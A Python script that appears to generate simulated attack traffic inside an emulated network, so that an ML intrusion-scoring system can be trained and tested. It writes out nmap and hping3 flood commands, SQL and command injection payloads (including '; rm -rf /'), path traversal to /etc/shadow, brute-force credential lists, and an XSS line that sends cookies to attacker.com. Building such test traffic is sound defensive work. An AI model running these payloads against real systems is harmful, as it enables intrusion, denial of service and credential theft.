#!/usr/bin/env python3
"""
Enhanced Attack Pattern Generator for ML Model Training
Generates intensive malicious traffic patterns to produce higher risk scores
"""

import time
import threading
from datetime import datetime


def generate_intensive_malicious_traffic_h6(h6, h1, h2):
    """
    Generate extremely aggressive attack patterns from h6 (MALICIOUS)
    This should produce risk scores > 0.15 to trigger blocking
    """
    print(f"\n🚨 LAUNCHING INTENSIVE MALICIOUS ATTACK PATTERNS FROM {h6.name}")
    print("="*70)
    
    # Phase 1: Massive Port Scanning Attack
    print("🔍 Phase 1: Massive aggressive port scanning...")
    for scan_round in range(5):  # Multiple scanning rounds
        h6.cmd(f'nmap -sS -T5 -p 1-1000 {h1.IP()} > /dev/null 2>&1 &')
        h6.cmd(f'nmap -sS -T5 -p 1-1000 {h2.IP()} > /dev/null 2>&1 &')
        time.sleep(1)
    
    time.sleep(10)  # Let scans process
    
    # Phase 2: SQL Injection Barrage
    print("💉 Phase 2: Massive SQL injection barrage...")
    for injection_round in range(10):
        for i in range(50):  # 50 injection attempts per round
            payload = f"DROP%20TABLE%20users;%20DELETE%20FROM%20admin;%20--{i}"
            h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h1.IP()}:8080/login?user=admin&pass={payload}" > /dev/null 2>&1')
            h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h2.IP()}:8081/admin?cmd={payload}" > /dev/null 2>&1')
            time.sleep(0.05)  # Very rapid fire
    
    # Phase 3: DDoS-style Traffic Flood
    print("💥 Phase 3: DDoS-style traffic flood...")
    for flood_round in range(20):
        for i in range(100):  # 100 requests per round
            h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h1.IP()}:8080/attack{i}" > /dev/null 2>&1 &')
            h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h2.IP()}:8081/exploit{i}" > /dev/null 2>&1 &')
        time.sleep(0.5)
    
    # Phase 4: Brute Force Attack
    print("🔨 Phase 4: Intensive brute force attack...")
    passwords = ['admin', 'password', '123456', 'root', 'qwerty', 'letmein', 
                'welcome', 'monkey', 'password123', 'admin123', 'test', 'guest']
    usernames = ['admin', 'root', 'administrator', 'user', 'test', 'guest']
    
    for user in usernames:
        for pwd in passwords:
            for attempt in range(5):  # 5 attempts per combination
                h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h1.IP()}:8080/login?user={user}&pass={pwd}&attempt={attempt}" > /dev/null 2>&1')
                h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h2.IP()}:8081/auth?username={user}&password={pwd}" > /dev/null 2>&1')
                time.sleep(0.05)
    
    # Phase 5: Directory Traversal and File Access Attempts
    print("📁 Phase 5: Directory traversal attacks...")
    traversal_payloads = [
        "../../../../etc/passwd",
        "../../../../etc/shadow", 
        "../../../../windows/system32/config/sam",
        "../../../boot.ini",
        "../../../../proc/self/environ"
    ]
    
    for payload in traversal_payloads:
        for i in range(20):
            h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h1.IP()}:8080/file?path={payload}&id={i}" > /dev/null 2>&1')
            h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h2.IP()}:8081/download?file={payload}" > /dev/null 2>&1')
            time.sleep(0.1)
    
    # Phase 6: Command Injection Attempts
    print("⚡ Phase 6: Command injection attacks...")
    cmd_payloads = [
        "; rm -rf /",
        "; cat /etc/passwd",
        "; ls -la /",
        "; ps aux",
        "; netstat -an",
        "; whoami"
    ]
    
    for payload in cmd_payloads:
        for i in range(30):
            encoded_payload = payload.replace(' ', '%20').replace(';', '%3B')
            h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h1.IP()}:8080/exec?cmd={encoded_payload}&id={i}" > /dev/null 2>&1')
            h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h2.IP()}:8081/system?command={encoded_payload}" > /dev/null 2>&1')
            time.sleep(0.1)

    print(f"✅ Intensive malicious attack pattern completed for {h6.name}")
    print("💡 This should generate risk scores > 0.15 for blocking")


def generate_intensive_malicious_traffic_h8(h8, h1, h2):
    """
    Generate different but equally aggressive attack patterns from h8 (MALICIOUS)
    """
    print(f"\n🚨 LAUNCHING INTENSIVE MALICIOUS ATTACK PATTERNS FROM {h8.name}")
    print("="*70)
    
    # Phase 1: Network Reconnaissance
    print("🕵️ Phase 1: Intensive network reconnaissance...")
    for recon_round in range(8):
        h8.cmd(f'nmap -sV -sC -O {h1.IP()} > /dev/null 2>&1 &')
        h8.cmd(f'nmap -sU -p 53,67,68,161,162 {h2.IP()} > /dev/null 2>&1 &')
        h8.cmd(f'nmap --script vuln {h1.IP()} > /dev/null 2>&1 &')
        time.sleep(2)
    
    # Phase 2: Web Application Attacks
    print("🌐 Phase 2: Web application attack barrage...")
    web_attacks = [
        "script%3Ealert('xss')%3C/script%3E",
        "../../../etc/passwd%00",
        "'; DROP TABLE users; --",
        "%27 UNION SELECT * FROM admin --",
        "<script>document.location='http://attacker.com/'+document.cookie</script>",
        "../../../../boot.ini%00"
    ]
    
    for attack in web_attacks:
        for i in range(40):  # 40 attempts per attack type
            h8.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h1.IP()}:8080/search?q={attack}&page={i}" > /dev/null 2>&1')
            h8.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h2.IP()}:8081/index.php?id={attack}" > /dev/null 2>&1')
            time.sleep(0.05)
    
    # Phase 3: Buffer Overflow Attempts
    print("💾 Phase 3: Buffer overflow simulation...")
    overflow_payload = "A" * 1000  # Large payload
    
    for i in range(50):
        h8.cmd(f'curl -s --connect-timeout 1 --max-time 2 -X POST "http://{h1.IP()}:8080/submit" -d "data={overflow_payload}{i}" > /dev/null 2>&1')
        h8.cmd(f'curl -s --connect-timeout 1 --max-time 2 -X POST "http://{h2.IP()}:8081/process" -d "input={overflow_payload}" > /dev/null 2>&1')
        time.sleep(0.1)
    
    # Phase 4: Protocol-level Attacks
    print("🔗 Phase 4: Protocol-level attacks...")
    for proto_round in range(15):
        # TCP SYN flood simulation
        h8.cmd(f'hping3 -S -p 80 -i u100 -c 50 {h1.IP()} > /dev/null 2>&1 &')
        h8.cmd(f'hping3 -S -p 443 -i u100 -c 50 {h2.IP()} > /dev/null 2>&1 &')
        
        # UDP flood simulation  
        h8.cmd(f'hping3 -2 -p 53 -i u100 -c 30 {h1.IP()} > /dev/null 2>&1 &')
        time.sleep(1)
    
    # Phase 5: Credential Stuffing
    print("🔑 Phase 5: Credential stuffing attack...")
    common_creds = [
        ('admin', 'admin'), ('root', 'root'), ('admin', 'password'),
        ('administrator', 'password'), ('admin', '123456'), ('root', 'toor'),
        ('admin', 'admin123'), ('sa', ''), ('postgres', 'postgres'),
        ('mysql', 'mysql'), ('oracle', 'oracle'), ('test', 'test')
    ]
    
    for user, pwd in common_creds:
        for attempt in range(10):  # 10 attempts per credential pair
            h8.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h1.IP()}:8080/api/login" -d "username={user}&password={pwd}&try={attempt}" > /dev/null 2>&1')
            h8.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h2.IP()}:8081/authenticate" -d "user={user}&pass={pwd}" > /dev/null 2>&1')
            time.sleep(0.05)
    
    # Phase 6: Data Exfiltration Simulation
    print("📤 Phase 6: Data exfiltration simulation...")
    for exfil_round in range(25):
        h8.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h1.IP()}:8080/backup?table=users&format=sql&round={exfil_round}" > /dev/null 2>&1')
        h8.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h2.IP()}:8081/export?data=all&type=csv" > /dev/null 2>&1')
        h8.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h1.IP()}:8080/dump?db=production&compress=true" > /dev/null 2>&1')
        time.sleep(0.2)

    print(f"✅ Intensive malicious attack pattern completed for {h8.name}")
    print("💡 This should generate risk scores > 0.15 for blocking")


def launch_continuous_background_attacks(h6, h8, h1, h2, duration=300):
    """
    Launch continuous background malicious traffic for sustained high risk scores
    Duration: time in seconds to run background attacks
    """
    print(f"\n🔄 LAUNCHING CONTINUOUS BACKGROUND ATTACKS FOR {duration} SECONDS")
    print("="*70)
    
    def h6_background_attack():
        end_time = time.time() + duration
        counter = 0
        while time.time() < end_time:
            counter += 1
            # Continuous scanning
            h6.cmd(f'nmap -sS -p 80,443,22,21,23 {h1.IP()} > /dev/null 2>&1 &')
            
            # Continuous SQL injections
            h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h1.IP()}:8080/login?user=admin&pass=%27%20OR%201=1%20--&cnt={counter}" > /dev/null 2>&1')
            h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h2.IP()}:8081/search?q=%27;DROP%20TABLE%20users;--&id={counter}" > /dev/null 2>&1')
            
            # Rapid requests
            for i in range(10):
                h6.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h1.IP()}:8080/attack{counter}_{i}" > /dev/null 2>&1 &')
            
            time.sleep(2)
    
    def h8_background_attack():
        end_time = time.time() + duration
        counter = 0
        while time.time() < end_time:
            counter += 1
            # Different attack pattern for h8
            h8.cmd(f'hping3 -S -p 80 -i u500 -c 20 {h2.IP()} > /dev/null 2>&1 &')
            
            # Brute force attempts
            h8.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h2.IP()}:8081/admin?user=root&pass=password{counter}" > /dev/null 2>&1')
            h8.cmd(f'curl -s --connect-timeout 1 --max-time 2 "http://{h1.IP()}:8080/shell?cmd=ls%20-la&session={counter}" > /dev/null 2>&1')
            
            # Buffer overflow attempts
            big_payload = "X" * 500
            h8.cmd(f'curl -s --connect-timeout 1 --max-time 2 -d "data={big_payload}" "http://{h1.IP()}:8080/process?id={counter}" > /dev/null 2>&1')
            
            time.sleep(2)
    
    # Start background threads
    h6_thread = threading.Thread(target=h6_background_attack)
    h8_thread = threading.Thread(target=h8_background_attack)
    
    h6_thread.start()
    h8_thread.start()
    
    print("🚀 Background attack threads launched")
    print("💡 These should maintain high risk scores throughout testing")
    
    return h6_thread, h8_thread
